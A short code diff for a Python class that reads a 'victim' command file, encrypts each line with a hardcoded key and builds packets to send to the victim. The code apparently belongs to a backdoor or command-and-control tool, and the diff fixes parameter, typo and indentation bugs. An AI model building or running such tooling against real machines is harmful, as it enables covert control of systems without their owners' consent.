@@ -11,7 +11,7 @@ import time
 
 class CommandParser():
 
-    def parse(self, victim_mac, command_file, victim_pkt):
+    def parse(self, victim_mac, victim_pkt, rel_path, command_file):
         """Parses the input file in the input directory of victim and builds packet for command
         
         Returns:
@@ -20,9 +20,9 @@ class CommandParser():
 
         # Read corresponding folder for input file
         pkts = []
-        path = dir + '/input/' + command_file
+        path = rel_path + '/input/' + command_file
         if os.path.isfile(path):
-            bundler = Bunder(victim_pkt)
+            bundler = Bundler(victim_pkt)
 
             # Open file contents, encrypt, and build response packet
             with open(path) as f:
@@ -30,13 +30,13 @@ class CommandParser():
 
                 for line in f:
                     line = line.replace('\n', '')
-                    commands.append(Encrypter(line, 'secret').encrypt())
+                    parsed_commands.append(Encrypter(line, 'secret').encrypt())
 
                 for cmd in parsed_commands:
                     pkt = bundler.build_command_pkt(cmd)
                     pkts.append(pkt)
         
-        os.remove(path) # Done reading file
+            os.remove(path) # Done reading file
         return pkts
 
     def _get_victim_dirs(self):
